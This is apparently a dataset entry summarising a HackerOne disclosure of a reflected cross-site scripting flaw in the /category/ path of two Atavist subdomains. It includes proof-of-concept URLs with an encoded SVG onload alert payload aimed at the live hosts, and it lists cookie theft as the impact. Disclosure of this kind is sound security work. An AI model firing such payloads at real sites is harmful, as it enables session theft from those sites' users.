# Reflected XSS at /category/ on a Atavis theme 

## Metadata
- **Source:** HackerOne
- **Report:** 950845 | https://hackerone.com/reports/950845
- **Submitted:** 2020-08-04
- **Reporter:** bugra
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Hi team,
This report is similar to #947790
You fixed the XSS on search, but I found another XSS at `/category/xsspayload`

For PoC you can check these URLs :
https://magazine.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E
https://docs.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E

You can encode " ' < > characters with HTML encoding in this endpoint.

#

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hi team,
This report is similar to #947790
You fixed the XSS on search, but I found another XSS at `/category/xsspayload`

For PoC you can check these URLs :
https://magazine.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E
https://docs.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E

You can encode " ' < > characters with HTML encoding in this endpoint.

## Impact

Reflected XSS - cookie stealing

Thanks,
Bugra

</details>

---
*Analysed by Claude on 2026-05-24*
